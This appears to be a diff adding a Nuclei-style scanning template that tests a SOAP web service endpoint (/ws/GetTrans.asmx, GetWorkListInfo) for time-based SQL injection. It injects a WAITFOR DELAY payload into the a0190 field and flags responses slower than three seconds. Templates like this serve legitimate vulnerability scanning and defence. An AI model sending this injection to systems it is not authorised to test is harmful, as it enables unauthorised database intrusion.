@@ -1,0 +1,33 @@
+id: lxtj-GetTrans-sqli
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /ws/GetTrans.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.76.69 Safari/537.36
+        Soapaction: "http://tempuri.org/GetWorkListInfo"
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+            <GetWorkListInfo xmlns="http://tempuri.org/">
+            <a0190>1';WAITFOR DELAY '0:0:3'--</a0190>
+            </GetWorkListInfo>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration > 3
